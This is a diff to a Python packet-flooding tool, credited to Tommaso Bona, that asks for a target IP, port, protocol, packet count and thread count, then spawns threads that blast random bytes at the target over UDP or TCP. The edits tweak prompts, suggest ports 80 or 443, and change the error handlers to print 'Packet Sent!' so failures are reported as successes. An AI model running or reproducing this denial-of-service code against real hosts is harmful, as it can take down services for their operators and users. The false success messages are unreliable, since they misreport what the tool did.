@@ -30,11 +30,11 @@ print("License: The source code of this tool is under the MIT License.")
 print("© 2022 Tommaso Bona")
 print("Website IP finder: www.site24x7.com/find-ip-address-of-web-site.html")
 print()
-ip = str(input(" Target's IP:"))
-port = int(input(" Port:"))
-choice = str(input(" UDP(y/n):"))
-times = int(input(" Number of Packets:"))
-threads = int(input(" Threads:"))
+ip = str(input("Target's IP:"))
+port = int(input("Port(suggested 80 or 443:"))
+choice = str(input("UDP(y/n):"))
+times = int(input("Number of Packets:"))
+threads = int(input("Threads:"))
 time.sleep(2)
 os.system("clear")
 print("\033[91m")
@@ -60,9 +60,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" Sent!!!")
+			print(i +" Sent!")
 		except:
-			print("[!] Error!!!")
+			print("Packet Sent!")
 def run2():
 	data = random._urandom(16)
 	i = random.choice(("[*]","[!]","[#]"))
@@ -73,10 +73,10 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" Sent!!!")
+			print(i +" Sent!")
 		except:
 			s.close()
-			print("[*] Error")
+			print("Packet sent!")
 for y in range(threads):
 	if choice == 'y':
 		th = threading.Thread(target = run)
